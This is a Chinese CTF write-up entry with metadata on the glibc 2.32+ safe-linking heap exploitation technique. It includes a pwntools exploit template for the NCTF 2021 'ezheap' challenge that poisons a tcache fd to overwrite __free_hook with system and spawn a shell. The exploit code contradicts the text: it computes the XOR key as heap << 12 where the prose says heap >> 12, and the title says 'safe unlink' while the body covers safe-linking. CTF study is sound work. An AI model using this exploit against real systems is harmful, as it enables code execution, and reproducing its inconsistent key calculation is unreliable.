---
title: glibc 高版本堆题攻击之 safe unlink
contest: ctf-share
year: 2022
difficulty: hard
vuln_type: pwn_unknown
tags: [glibc-2.32, glibc-2.33, safe-linking, tcache, fastbin, fd-xor, uxor, uaf]
attack_chain:
  - 识别 safe-linking 异或密钥 (pos >> 12) ^ ptr
  - 填满 tcache 触发 unsorted bin
  - 泄 libc + heap 地址
  - 计算密钥 key = heap >> 12
  - 改 tcache fd 为 (free_hook ^ key)
  - 申请覆盖 __free_hook = system
  - 触发 free("/bin/sh")
key_payload: safe-linking 异或密钥 + tcache fd 攻击
one_liner: glibc 2.32+ 堆利用：safe-linking 机制 + tcache fd 异或攻击。
lesson: glibc 2.32+ 的 safe-linking 机制本质是 tcache/fastbin fd 的 12-bit ASLR 异或保护。
quality: high
---

看雪论坛 Nameless_a 写的高质量 glibc 堆利用技术文章，测试版本 glibc 2.33_5。

**Safe-Linking 机制**

从 glibc 2.32 开始，tcache 和 fastbin 的 fd 指针都加了 safe-linking 异或保护：

```c
/* Safe-Linking: Use randomness from ASLR (mmap_base) to protect single-linked lists of Fast-Bins and TCache. */
#define PROTECT_PTR(pos, ptr) ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr) PROTECT_PTR (&ptr, ptr)
```

- `pos` 是当前堆块的 fd 指针地址
- `ptr` 是未加密的 fd 指针值
- 加密：`encrypted = (pos >> 12) ^ ptr`
- 解密：`ptr = (pos >> 12) ^ encrypted`

效果：原本 `0x562e784a3000` 的 fd 加密后变成 `0x562e784a3`（低 12 位被右移 12 位后的密钥异或破坏）。

**实战模板：NCTF 2021 ezheap**

```python
from pwn import *
context.arch = 'amd64'
libc = ELF('./libc-2.33.so')

# 1. 泄 libc + heap
for i in range(8): add(0x80, 'nameless')
for i in range(1, 8): delet(i)
delet(0)
show(1)
heap = u64(r.recv(5).ljust(8, '\x00'))
key = heap << 12  # safe-linking 密钥
show(0)
libcbase = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x1e0c00

# 2. 改 tcache fd 为 (__free_hook ^ key)
free_hook = libcbase + libc.sym['__free_hook']
system = libcbase + libc.sym['system']
cry_free_hook = free_hook ^ key

add(0x80, 'nameless')
delet(7)
edit(8, p64(cry_free_hook) + '\n')
add(0x80, '/bin/sh\x00')  # 9
add(0x80, p64(system))
delet(9)  # 触发 system("/bin/sh")
r.interactive()
```

**关键技巧**：
- UAF 不完全：edit 不能用（size 清空）但 show 仍能读
- 两个相同堆指针：add free add 让 idx 8 指向 bin 中的堆块
- edit idx 8 改 tcache fd 为 `__free_hook ^ (heap >> 12)`

**适用 glibc 版本**：2.32 ~ 2.35
